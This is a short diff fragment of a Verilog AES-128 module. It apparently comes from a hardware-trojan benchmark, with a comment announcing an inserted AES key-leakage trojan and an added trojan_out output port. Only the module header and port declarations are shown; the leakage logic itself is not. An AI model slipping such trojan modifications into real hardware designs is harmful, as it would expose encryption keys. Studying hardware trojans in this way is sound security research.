@@ -1,3 +1,6 @@
+// Trojan inserted AES key leakage RTL
+
+
 module aes_128(clk, rst_n, state, key, out, trojan_out); // Trojan I/O added
     input          clk;
     input          rst_n; // Added active-low reset for synthesizability
